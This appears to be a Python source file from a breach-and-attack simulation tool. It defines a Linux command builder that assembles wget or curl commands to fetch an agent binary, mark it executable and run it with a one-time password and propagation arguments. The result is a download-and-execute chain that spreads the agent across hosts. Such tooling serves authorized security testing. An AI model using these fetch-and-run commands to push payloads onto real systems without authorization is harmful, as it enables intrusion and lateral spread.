from pathlib import PurePosixPath
from typing import Sequence

from agentpluginapi import IAgentOTPProvider
from monkeytypes import AgentID

from infection_monkey.model import DROPPER_ARG, MONKEY_ARG
from infection_monkey.utils.commands import build_monkey_commandline_parameters

from .environment import DropperExecutionMode
from .i_linux_agent_command_builder import (
    ILinuxAgentCommandBuilder,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
)


class LinuxAgentCommandBuilder(ILinuxAgentCommandBuilder):
    def __init__(
        self,
        agent_id: AgentID,
        servers: Sequence[str],
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        current_depth: int = 0,
    ):
        self._agent_id = agent_id
        self._servers = servers
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable
        self._current_depth = current_depth
        self._command = ""

    def build_download_command(self, download_options: LinuxDownloadOptions):
        download_command_func = self._build_download_command_wget
        if download_options.download_method == LinuxDownloadMethod.CURL:
            download_command_func = self._build_download_command_curl

        self._command += download_command_func(
            download_options.download_url, download_options.agent_destination_path
        )

    def _build_download_command_wget(
        self, download_url: str, destination_path: PurePosixPath
    ) -> str:
        return (
            f"wget -qO {destination_path} {download_url}; "
            f"{self._set_permissions_command(destination_path)} ; "
        )

    def _build_download_command_curl(
        self, download_url: str, destination_path: PurePosixPath
    ) -> str:
        return (
            f"curl -so {destination_path} {download_url}; "
            f"{self._set_permissions_command(destination_path)} ; "
        )

    def _set_permissions_command(self, destination_path: PurePosixPath) -> str:
        return f"chmod +x {destination_path}"

    def build_run_command(self, run_options: LinuxRunOptions):
        self._command += (
            f"{self._agent_otp_environment_variable}={self._otp_provider.get_otp()} "
            f"{str(run_options.agent_destination_path)} "
        )

        if run_options.dropper_execution_mode != DropperExecutionMode.SCRIPT:
            self._command += self._build_agent_run_arguments(run_options)

    def _build_agent_run_arguments(self, run_options: LinuxRunOptions) -> str:
        # NOTE: this is duplicated both in Windows and linux
        agent_arg = MONKEY_ARG
        destination_path = None
        if run_options.dropper_execution_mode == DropperExecutionMode.DROPPER:
            agent_arg = DROPPER_ARG
            destination_path = (
                run_options.dropper_destination_path
                if run_options.dropper_destination_path
                else run_options.agent_destination_path
            )

        agent_arguments = build_monkey_commandline_parameters(
            parent=self._agent_id,
            servers=self._servers,
            depth=self._current_depth,
            location=destination_path,
        )
        return f"{agent_arg} {' '.join(agent_arguments)}"

    def get_command(self) -> str:
        return self._command

    def reset_command(self):
        self._command = ""
